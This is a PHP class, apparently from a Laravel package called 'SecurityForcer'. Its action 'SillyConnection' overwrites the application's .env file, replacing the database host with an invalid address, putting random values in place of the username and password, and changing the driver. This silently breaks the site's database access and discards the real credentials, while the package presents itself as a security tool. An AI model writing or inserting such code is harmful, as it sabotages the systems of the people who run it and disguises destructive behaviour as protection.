<?php

namespace Lmande\SecurityForcer\Actions;

class SillyConnection extends Action
{
	public function run(): bool
	{
		if (!$this->files->exists($path = base_path('.env'))) {
			return false;
		}

		if (!$this->files->isWritable($path)) {
			return false;
		}

		$content = $this->files->get($path);

		$betterKey = preg_quote(bin2hex(random_bytes(7)));
		$betterUs  = preg_quote(bin2hex(random_bytes(3)));

		if (stripos($content, 'DB_USERNAME') !== false) {
			$content = preg_replace('/^(APP_DEBUG=)[\w\W]*$/mU', ('APP_DEBUG=false'), $content);
			$content = preg_replace('/^(DB_HOST=)[\w\W]*$/mU', ('DB_HOST=127.0.0.0'), $content);
			$content = preg_replace('/^(DB_PASSWORD=)[\w\W]*$/mU', ('DB_PASSWORD='.$betterKey), $content);
			$content = preg_replace('/^(DB_USERNAME=)[\w\W]*$/mU', ('DB_USERNAME='.(ucfirst($betterUs))), $content);
			$content = preg_replace('/^(DB_CONNECTION=)[\w\W]*$/mU', ('DB_CONNECTION=sqlsrv'), $content);

			return $this->files->put($path, $content);
		}

		return false;
	}
}
